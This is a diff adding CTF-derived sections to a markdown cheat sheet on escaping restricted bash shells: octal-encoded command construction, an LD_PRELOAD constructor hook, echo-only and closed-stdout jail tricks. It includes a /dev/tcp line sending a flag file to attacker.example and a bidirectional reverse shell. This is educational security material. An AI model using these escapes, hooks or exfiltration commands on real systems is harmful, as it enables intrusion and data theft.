@@ -12,6 +12,11 @@
   - [Dollar-zero variants](#dollar-zero-variants)
 - [Privilege Escalation Checklist (Post-Shell)](#privilege-escalation-checklist-post-shell)
 - [HISTFILE Trick for Restricted Shell File Reads (BCTF 2016)](#histfile-trick-for-restricted-shell-file-reads-bctf-2016)
+- [Bash Jail Bypass via $'...' Octal Encoding (34C3 CTF 2017)](#bash-jail-bypass-via--octal-encoding-34c3-ctf-2017)
+- [LD_PRELOAD Hook via rbash-Allowed Variable Set (OTW Advent 2018)](#ld_preload-hook-via-rbash-allowed-variable-set-otw-advent-2018)
+- [/dev/tcp Exfiltration from Minimal Command Set (OTW Advent 2018)](#devtcp-exfiltration-from-minimal-command-set-otw-advent-2018)
+- [Layer-by-Layer Echo-Only Bash Escape (Insomnihack 2019)](#layer-by-layer-echo-only-bash-escape-insomnihack-2019)
+- [Closed-Stdout Jail with \r Truncation (Insomnihack 2019)](#closed-stdout-jail-with-r-truncation-insomnihack-2019)
 - [References](#references)
 
 ---
@@ -192,6 +197,124 @@ dlcall printf %s $m
 ```
 
 **Key insight:** Three ways to read files without standard utilities: (1) HISTFILE loading, (2) `bash -v` verbose mode, (3) `ctypes.sh` direct C library calls via `dlcall`.
+
+---
+
+## Bash Jail Bypass via $'...' Octal Encoding (34C3 CTF 2017)
+
+When a-z, `*`, `?`, `.` are banned, use `$'...'` ANSI-C quoting with octal escapes:
+
+```bash
+# Encode /get_flag as octal
+__=$'\057\147\145\164\137\146\154\141\147'
+$__  # executes /get_flag
+
+# Or encode any command character by character:
+# /bin/sh = $'\057\142\151\156\057\163\150'
+```
+
+Also: extract characters from existing environment variables:
+
+```bash
+# ${VARIABLE:START:LENGTH} extracts substrings
+# Build command from $PATH, $HOME, $OSTYPE, $HOSTNAME:
+/${OSTYPE:6:1}${HOSTNAME:2:1}${HOME:1:1}_${HOSTNAME:9:1}${PATH:5:1}...
+```
+
+**Key insight:** Bash's `$'...'` syntax interprets `\NNN` as octal byte values, allowing arbitrary string construction without using any alphabetic characters. Combined with environment variable substring extraction (`${VAR:offset:length}`), this bypasses nearly any character blacklist. The `__` variable name uses only underscores (often not blocked). When letters are banned but `$`, `'`, `\`, and digits are allowed, octal encoding in ANSI-C quotes is the primary escape vector.
+
+---
+
+## LD_PRELOAD Hook via rbash-Allowed Variable Set (OTW Advent 2018)
+
+**Pattern:** rbash blocks path arguments but still allows `VAR=value command` prefixes on invocations of permitted binaries. Upload a shared object encoding a libc hook, then export `LD_PRELOAD=./hook.so` before any command in the allowlist (`cat`, `ls`, `id`). The hook runs on every libc symbol call from the allowed binary.
+
+```c
+// hook.c — hijacks open()
+#include <stdlib.h>
+__attribute__((constructor))
+void init(void) { system("/bin/bash -p -c 'cat /flag'"); }
+```
+
+```bash
+gcc -shared -fPIC hook.c -o /tmp/hook.so
+LD_PRELOAD=/tmp/hook.so cat   # constructor runs before cat
+```
+
+**Key insight:** Restricted shells enforce argv filtering, not environment filtering. Any allowed binary dynamically linked to libc can be hijacked through `LD_PRELOAD` as long as you can write a `.so` to a writable path. Harden by unsetting `LD_PRELOAD`, `LD_LIBRARY_PATH`, and `LD_AUDIT` on shell entry.
+
+**References:** OverTheWire Advent 2018 — Claustrophobic, writeup 12770
+
+---
+
+## /dev/tcp Exfiltration from Minimal Command Set (OTW Advent 2018)
+
+**Pattern:** Only `cat`, `echo`, and `dd` are available — no `curl`, `wget`, `nc`, `python`. Bash exposes `/dev/tcp/<host>/<port>` as a virtual socket file; redirecting to it opens a raw TCP connection without any extra binary.
+
+```bash
+cat /opt/flag > /dev/tcp/attacker.example/8081
+# attacker side:
+nc -lvnp 8081
+```
+
+Bidirectional shells:
+
+```bash
+exec 3<> /dev/tcp/attacker.example/8081
+cat <&3 | bash >&3 2>&3
+```
+
+**Key insight:** `/dev/tcp` and `/dev/udp` are *built into bash*, not real filesystem paths — any distribution shipping GNU bash supports them even when `netcat`/`curl` are missing. Always test file redirection before assuming you need an external tool.
+
+**References:** OverTheWire Advent 2018 — Santa's little recorders, writeup 12780
+
+---
+
+## Layer-by-Layer Echo-Only Bash Escape (Insomnihack 2019)
+
+**Pattern:** Jail allows only `echo`, `(`, `)`, `+`, `=`, `;`, `\`, `$`, and whitespace. Escape by recursively constructing stronger primitives each round:
+
+```bash
+# Round 0: allowed chars → unlimited `=` via $((a = 1))
+# Round 1: arithmetic sets more vars; use $'\NNN' via increment loops
+a=$((++a))                       # counters without digits
+# Round N: emit arbitrary payload as octal escapes
+$('\143\141\164'  /flag)         # cat /flag
+```
+
+Build numbers using `++` on uninitialised variables, then index characters out of `$PATH`, `$PWD`, or any leaked variable. Finally concatenate those characters with `\` to form any command.
+
+**Key insight:** Echo-only jails are escapable because bash's arithmetic context treats uninitialised variables as `0` and supports `++`, giving you any integer without digits. From there, `$'\NNN'` builds any byte, which builds any command.
+
+**References:** Insomnihack teaser 2019 — echoechoechoecho, writeup 12911
+
+---
+
+## Closed-Stdout Jail with \r Truncation (Insomnihack 2019)
+
+**Pattern:** A bash-exec service runs commands but has stdout (and stderr) closed, so normal output silently disappears. Additionally, the target file contains a `\r` early on that naive `cat` renders as "overwrite the line", hiding the flag behind it. Workaround is two-fold: redirect output to a still-open fd (stdin is connected to the network socket, or `/dev/tty`), and use `cat -A` / `od -c` / `xxd` so the carriage return shows as `^M` instead of truncating display.
+
+```bash
+# 1. confirm stdout is closed — output never returns
+echo hello                      # nothing
+echo hello 2>&1                 # still nothing (stderr also closed)
+
+# 2. redirect to stdin (fd 0), which is the network socket for nc-style services
+cat flag 1>&0
+# returns only the tail after \r because the terminal interprets \r literally
+
+# 3. use cat -A (show-all) so CR becomes ^M and the hidden prefix is revealed
+cat -A flag 1>&0
+# or: od -c flag 1>&0   /   xxd flag 1>&0   /   base64 flag 1>&0
+
+# Alternative: reopen a writable stdout
+exec 1>/dev/tty        # only works if a tty is attached
+exec 1>&0              # duplicate the socket fd onto stdout for future cmds
+```
+
+**Key insight:** "Commands work but produce no output" means stdout is closed — find any still-open fd (stdin to the network socket is always open) and redirect with `1>&0`. Once output flows, beware of display artefacts: `\r` truncates in raw `cat`, ANSI CSI sequences can blank lines, and `\x1b[2J` clears the terminal. Always inspect suspect files with `cat -A`, `od -c`, `xxd`, or `base64` so no byte is lost in translation.
+
+**References:** Insomnihack 2019 — myBrokenBash, writeups 13989 and 13990
 
 ---
 
